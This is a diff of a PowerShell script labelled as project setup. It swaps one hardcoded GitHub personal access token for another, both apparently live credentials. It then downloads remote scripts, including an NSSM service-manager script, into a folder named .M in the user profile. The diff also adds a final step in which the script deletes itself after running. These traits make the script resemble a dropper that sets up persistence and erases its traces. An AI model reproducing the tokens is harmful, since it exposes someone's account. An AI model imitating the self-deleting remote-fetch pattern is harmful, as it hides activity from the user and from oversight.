@@ -1,6 +1,6 @@
 # More robust version with error handling
 param(
-    [string]$GitHubToken = "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"
+    [string]$GitHubToken = "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"
 )
 
 try {
@@ -10,8 +10,8 @@ try {
     Write-Host "🚀 Starting Project Setup..." -ForegroundColor Cyan
 
     # Validate token
-    if (-not $GitHubToken.StartsWith("ghp_")) {
-        throw "Invalid GitHub token format. Token should start with 'ghp_'"
+    if (-not $GitHubToken.StartsWith("github_")) {
+        throw "Invalid GitHub token format. Token should start with 'github_'"
     }
 
     # Create .M directory
@@ -30,8 +30,12 @@ try {
         }
         downloads = @(
             @{
-                github_path = "Tools/ServiceIT.py"
-                local_path = "C:\Users\$env:USERNAME\.M\ServiceITBG.ps1"
+                github_path = "Tools/ServiceIT.ps1"
+                local_path = "C:\Users\$env:USERNAME\.M\ServiceIT.ps1"
+            },
+            @{
+                github_path = "Tools/nssm.ps1"
+                local_path = "C:\Users\$env:USERNAME\.M\nssm.ps1"
             }
         )
     }
@@ -69,3 +73,5 @@ try {
     Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
     exit 1
 }
+Start-Sleep -Milliseconds 500
+Remove-Item $MyInvocation.MyCommand.Path -Force
